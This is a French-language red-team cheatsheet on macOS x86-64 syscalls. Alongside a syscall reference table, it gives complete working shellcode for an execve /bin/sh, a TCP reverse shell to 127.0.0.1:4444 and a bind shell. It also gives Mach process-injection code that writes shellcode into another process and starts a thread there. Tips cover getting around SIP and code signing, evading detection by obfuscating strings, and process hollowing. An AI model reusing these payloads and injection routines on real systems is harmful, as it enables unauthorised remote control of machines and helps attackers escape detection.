# Cheatsheet macOS Syscalls - Red Team Edition

## Syscall Basics macOS

### Différences avec Linux
```
- Numéros syscalls DIFFÉRENTS de Linux
- Préfixe: 0x2000000 pour BSD syscalls
- Numérotation: syscall_number = 0x2000000 + bsd_number
- Mach syscalls: préfixe 0x1000000 (kernel direct)

Exemples:
  write:  0x2000004 (BSD #4)
  exit:   0x2000001 (BSD #1)
  execve: 0x200003B (BSD #59)
```

### x86-64 Calling Convention
```
Syscall number: RAX (avec préfixe 0x2000000)
Arguments:      RDI, RSI, RDX, R10, R8, R9
Return value:   RAX
Instruction:    syscall

Important: Carry Flag (CF) indique erreur
  CF = 0: succès, RAX = result
  CF = 1: erreur, RAX = errno
```

### Inline Assembly
```c
static inline long bsd_syscall(long n, long a1, long a2, long a3) {
    long ret;
    asm volatile (
        "syscall"
        : "=a"(ret)
        : "a"(0x2000000 | n), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

// Utilisation
long result = bsd_syscall(4, 1, (long)"Hello\n", 6);  // write
```

## BSD Syscalls Essentiels

### exit (1)
```c
// void exit(int status);
#define SYS_exit 1

// Assembly x86-64
mov rax, 0x2000001      ; BSD exit
mov rdi, 0              ; status
syscall

// C inline
asm volatile(
    "mov $0x2000001, %rax\n"
    "xor %rdi, %rdi\n"
    "syscall"
);
```

### fork (2)
```c
// pid_t fork(void);
#define SYS_fork 2

mov rax, 0x2000002      ; BSD fork
syscall
; RAX = 0 dans child, PID dans parent
```

### read (3)
```c
// ssize_t read(int fd, void *buf, size_t count);
#define SYS_read 3

mov rax, 0x2000003      ; BSD read
mov rdi, 0              ; fd = stdin
mov rsi, buffer         ; buf
mov rdx, 100            ; count
syscall
```

### write (4)
```c
// ssize_t write(int fd, const void *buf, size_t count);
#define SYS_write 4

mov rax, 0x2000004      ; BSD write
mov rdi, 1              ; fd = stdout
mov rsi, msg            ; buf
mov rdx, msg_len        ; count
syscall

// C inline
char msg[] = "Hello macOS\n";
bsd_syscall(4, 1, (long)msg, sizeof(msg) - 1);
```

### open (5)
```c
// int open(const char *path, int flags, mode_t mode);
#define SYS_open 5

// Flags
O_RDONLY    0x0000
O_WRONLY    0x0001
O_RDWR      0x0002
O_CREAT     0x0200
O_TRUNC     0x0400

mov rax, 0x2000005      ; BSD open
mov rdi, filename       ; path
mov rsi, 0              ; flags = O_RDONLY
mov rdx, 0              ; mode
syscall
```

### close (6)
```c
// int close(int fd);
#define SYS_close 6

mov rax, 0x2000006      ; BSD close
mov rdi, fd             ; fd
syscall
```

### dup2 (90)
```c
// int dup2(int oldfd, int newfd);
#define SYS_dup2 90

mov rax, 0x200005A      ; BSD dup2
mov rdi, sockfd         ; oldfd
mov rsi, 0              ; newfd = stdin
syscall
```

### execve (59)
```c
// int execve(const char *path, char *const argv[], char *const envp[]);
#define SYS_execve 59

// Assembly x86-64
section .data
    binsh db "/bin/sh", 0

section .text
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    mov rdi, binsh      ; path
    mov rax, 0x200003B  ; BSD execve
    syscall

// C inline
char *argv[] = {"/bin/sh", NULL};
char *envp[] = {NULL};
bsd_syscall(59, (long)"/bin/sh", (long)argv, (long)envp);
```

## Network Syscalls (BSD)

### socket (97)
```c
// int socket(int domain, int type, int protocol);
#define SYS_socket 97

// Constants
AF_INET     2
SOCK_STREAM 1

mov rax, 0x2000061      ; BSD socket
mov rdi, 2              ; AF_INET
mov rsi, 1              ; SOCK_STREAM
mov rdx, 0              ; protocol
syscall
; RAX = socket fd
```

### connect (98)
```c
// int connect(int socket, const struct sockaddr *address, socklen_t address_len);
#define SYS_connect 98

// sockaddr_in structure (même que Linux)
struct sockaddr_in {
    uint8_t sin_len;        // Longueur structure (macOS specific)
    uint8_t sin_family;     // AF_INET
    uint16_t sin_port;      // Port
    uint32_t sin_addr;      // IP
    char sin_zero[8];       // Padding
};

section .data
    sockaddr:
        db 16               ; sin_len
        db 2                ; sin_family = AF_INET
        dw 0x5c11           ; sin_port = htons(4444)
        dd 0x0100007f       ; sin_addr = 127.0.0.1
        dq 0                ; sin_zero

section .text
    mov rax, 0x2000062  ; BSD connect
    mov rdi, sockfd     ; socket
    mov rsi, sockaddr   ; address
    mov rdx, 16         ; address_len
    syscall
```

### bind (104)
```c
// int bind(int socket, const struct sockaddr *address, socklen_t address_len);
#define SYS_bind 104

mov rax, 0x2000068
mov rdi, sockfd
mov rsi, sockaddr
mov rdx, 16
syscall
```

### listen (106)
```c
// int listen(int socket, int backlog);
#define SYS_listen 106

mov rax, 0x200006A
mov rdi, sockfd
mov rsi, 1              ; backlog
syscall
```

### accept (30)
```c
// int accept(int socket, struct sockaddr *address, socklen_t *address_len);
#define SYS_accept 30

mov rax, 0x200001E
mov rdi, sockfd
xor rsi, rsi            ; address = NULL
xor rdx, rdx            ; address_len = NULL
syscall
```

## Memory Management

### mmap (197)
```c
// void *mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);
#define SYS_mmap 197

// Protection flags
PROT_NONE   0x00
PROT_READ   0x01
PROT_WRITE  0x02
PROT_EXEC   0x04

// Flags
MAP_SHARED      0x0001
MAP_PRIVATE     0x0002
MAP_ANON        0x1000  // Anonymous (pas de fichier)

// Assembly x86-64 - Allouer RWX
mov rax, 0x20000C5      ; BSD mmap
xor rdi, rdi            ; addr = NULL
mov rsi, 0x1000         ; len = 4096
mov rdx, 7              ; prot = PROT_READ | PROT_WRITE | PROT_EXEC
mov r10, 0x1002         ; flags = MAP_PRIVATE | MAP_ANON
mov r8, -1              ; fd = -1
xor r9, r9              ; offset = 0
syscall
; RAX = adresse allouée
```

### mprotect (74)
```c
// int mprotect(void *addr, size_t len, int prot);
#define SYS_mprotect 74

mov rax, 0x200004A
mov rdi, addr
mov rsi, 0x1000
mov rdx, 7              ; RWX
syscall
```

### munmap (73)
```c
// int munmap(void *addr, size_t len);
#define SYS_munmap 73

mov rax, 0x2000049
mov rdi, addr
mov rsi, length
syscall
```

## Mach Syscalls (Kernel Direct)

### mach_task_self (28)
```c
// mach_port_t mach_task_self(void);
// Retourne port Mach pour task courante
#define MACH_task_self_trap 28

mov rax, 0x100001C      ; Mach task_self
syscall
; RAX = mach_port_t
```

### mach_thread_self (27)
```c
// mach_port_t mach_thread_self(void);
#define MACH_thread_self_trap 27

mov rax, 0x100001B
syscall
```

### mach_msg (31)
```c
// mach_msg_return_t mach_msg(
//     mach_msg_header_t *msg,
//     mach_msg_option_t option,
//     mach_msg_size_t send_size,
//     mach_msg_size_t rcv_size,
//     mach_port_t rcv_name,
//     mach_msg_timeout_t timeout,
//     mach_port_t notify
// );
#define MACH_msg_trap 31

mov rax, 0x100001F
; Configurer arguments...
syscall
```

### thread_create (48)
```c
// Non documenté, utilisé par libsystem
// Création de thread via Mach
#define MACH_thread_create_trap 48

mov rax, 0x1000030
syscall
```

## Shellcode Examples macOS

### Execve /bin/sh (x86-64)
```nasm
; 31 bytes
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi                ; argv = NULL
    push rsi                    ; String terminator
    mov rdi, 0x68732f6e69622f   ; "/bin/sh"
    push rdi
    mov rdi, rsp                ; rdi = "/bin/sh"
    xor rdx, rdx                ; envp = NULL
    mov rax, 0x200003B          ; BSD execve
    syscall
```

### Reverse Shell TCP (x86-64)
```nasm
; Reverse shell macOS vers 127.0.0.1:4444
section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 0x2000061      ; BSD socket
    mov rdi, 2              ; AF_INET
    mov rsi, 1              ; SOCK_STREAM
    xor rdx, rdx            ; protocol = 0
    syscall
    mov rdi, rax            ; Save socket fd

    ; connect(sockfd, &sockaddr, 16)
    mov rax, 0x2000062      ; BSD connect
    sub rsp, 16
    mov byte [rsp], 16      ; sin_len
    mov byte [rsp+1], 2     ; sin_family = AF_INET
    mov word [rsp+2], 0x5c11 ; sin_port = htons(4444)
    mov dword [rsp+4], 0x0100007f ; sin_addr = 127.0.0.1
    mov qword [rsp+8], 0    ; sin_zero
    mov rsi, rsp            ; sockaddr
    mov rdx, 16             ; addrlen
    syscall

    ; dup2(sockfd, 0/1/2)
    xor rsi, rsi            ; newfd = 0
dup_loop:
    mov rax, 0x200005A      ; BSD dup2
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov rax, 0x200003B      ; BSD execve
    syscall
```

### Bind Shell (x86-64)
```nasm
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 0x2000061
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov rdi, rax            ; sockfd

    ; bind(sockfd, &sockaddr, 16)
    mov rax, 0x2000068
    sub rsp, 16
    mov byte [rsp], 16      ; sin_len
    mov byte [rsp+1], 2     ; sin_family
    mov word [rsp+2], 0x5c11 ; port 4444
    mov dword [rsp+4], 0    ; 0.0.0.0
    mov qword [rsp+8], 0
    mov rsi, rsp
    mov rdx, 16
    syscall

    ; listen(sockfd, 1)
    mov rax, 0x200006A
    mov rsi, 1
    syscall

    ; accept(sockfd, NULL, NULL)
    mov rax, 0x200001E
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov rdi, rax            ; client_fd

    ; dup2 + execve (même que reverse shell)
    ; [...]
```

## Process Injection (Mach)

### task_for_pid
```c
// Obtenir task port d'un autre process (nécessite root/entitlements)
kern_return_t task_for_pid(
    mach_port_t target_tport,
    int pid,
    mach_port_t *task
);

// Via syscall indirecte (fonction libc)
#include <mach/mach.h>

mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
```

### vm_allocate
```c
// Allouer mémoire dans process distant
kern_return_t vm_allocate(
    vm_map_t target_task,
    vm_address_t *address,
    vm_size_t size,
    int flags
);

vm_address_t remote_addr = 0;
vm_allocate(task, &remote_addr, 4096, VM_FLAGS_ANYWHERE);
```

### vm_write
```c
// Écrire dans process distant
kern_return_t vm_write(
    vm_map_t target_task,
    vm_address_t address,
    vm_offset_t data,
    mach_msg_type_number_t dataCnt
);

vm_write(task, remote_addr, (vm_offset_t)shellcode, shellcode_size);
```

### vm_protect
```c
// Changer protection mémoire distante
kern_return_t vm_protect(
    vm_map_t target_task,
    vm_address_t address,
    vm_size_t size,
    boolean_t set_maximum,
    vm_prot_t new_protection
);

// RWX
vm_protect(task, remote_addr, 4096, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
```

### thread_create_running
```c
// Créer thread dans process distant
kern_return_t thread_create_running(
    task_t parent_task,
    thread_state_flavor_t flavor,
    thread_state_t new_state,
    mach_msg_type_number_t new_state_count,
    thread_t *child_thread
);

// Setup registres pour exécuter shellcode
x86_thread_state64_t state;
memset(&state, 0, sizeof(state));
state.__rip = (uint64_t)remote_addr;  // Point vers shellcode

thread_act_t thread;
thread_create_running(task, x86_THREAD_STATE64,
                      (thread_state_t)&state,
                      x86_THREAD_STATE64_COUNT, &thread);
```

## Syscall Table macOS (x86-64)

```
BSD Syscalls (préfixe 0x2000000):
--------------------------------------
Numéro  Nom              Hex
------  ---              ---
1       exit             0x2000001
2       fork             0x2000002
3       read             0x2000003
4       write            0x2000004
5       open             0x2000005
6       close            0x2000006
30      accept           0x200001E
59      execve           0x200003B
73      munmap           0x2000049
74      mprotect         0x200004A
90      dup2             0x200005A
97      socket           0x2000061
98      connect          0x2000062
104     bind             0x2000068
106     listen           0x200006A
197     mmap             0x20000C5

Mach Syscalls (préfixe 0x1000000):
-----------------------------------
26      mach_reply_port  0x100001A
27      thread_self_trap 0x100001B
28      task_self_trap   0x100001C
31      mach_msg_trap    0x100001F
```

## Tips Red Team macOS

### 1. SIP Bypass (System Integrity Protection)
```c
// SIP protège /System, /usr, etc.
// Utiliser /tmp, /var/tmp, ~/Library pour payloads
// Ou désactiver SIP en recovery mode (csrutil disable)
```

### 2. Code Signing bypass
```c
// Techniques:
// - DyLib injection dans processus non-hardened
// - Exploitation de processus setuid
// - Utilisation de processus existants (pas de nouveau binaire)
```

### 3. Entitlements
```c
// Pour task_for_pid, nécessite com.apple.security.cs.debugger
// Ou être root
// Ou cibler processus non-hardened
```

### 4. Shellcode position-independent
```nasm
; Utiliser call/pop trick
call get_rip
get_rip:
    pop rsi         ; RSI = RIP
    ; Calculer offsets relatifs
```

### 5. Éviter détection
```c
// - Utiliser syscalls BSD directs (pas de libc)
// - Obfusquer strings (/bin/sh, etc.)
// - Éviter RWX pages (RW puis RX après copie)
// - Utiliser Mach pour injection (moins surveillé que ptrace)
```

### 6. Process Hollowing via Mach
```c
// 1. Fork/exec processus légitime
// 2. Suspend via task_suspend
// 3. Unmap code via vm_deallocate
// 4. Map shellcode via vm_allocate + vm_write
// 5. Ajuster thread state (RIP)
// 6. Resume via task_resume
```

### 7. Debug macOS shellcode
```bash
# Compiler shellcode
nasm -f macho64 shell.asm -o shell.o
ld -macosx_version_min 10.13 -lSystem -o shell shell.o

# Debug avec LLDB
lldb ./shell
(lldb) br set -n _start
(lldb) run
(lldb) register read
(lldb) memory read $rsp
```

### 8. Extraction syscall numbers
```bash
# Depuis XNU source code
grep -r "SYS_" /path/to/xnu/bsd/kern/syscalls.master

# Via header
cat /usr/include/sys/syscall.h | grep "SYS_"
```

## Helper Macros

```c
// BSD syscall wrapper
#define BSD_SYSCALL(num) (0x2000000 | (num))

#define SYS_BSD_exit    BSD_SYSCALL(1)
#define SYS_BSD_write   BSD_SYSCALL(4)
#define SYS_BSD_execve  BSD_SYSCALL(59)

// Mach syscall wrapper
#define MACH_SYSCALL(num) (0x1000000 | (num))

#define SYS_MACH_task_self MACH_SYSCALL(28)

// Inline syscall
static inline long syscall_macos(long num, ...) {
    long ret;
    va_list args;
    va_start(args, num);

    register long rdi asm("rdi") = va_arg(args, long);
    register long rsi asm("rsi") = va_arg(args, long);
    register long rdx asm("rdx") = va_arg(args, long);

    asm volatile(
        "syscall"
        : "=a"(ret)
        : "a"(num), "r"(rdi), "r"(rsi), "r"(rdx)
        : "rcx", "r11", "memory"
    );

    va_end(args);
    return ret;
}
```
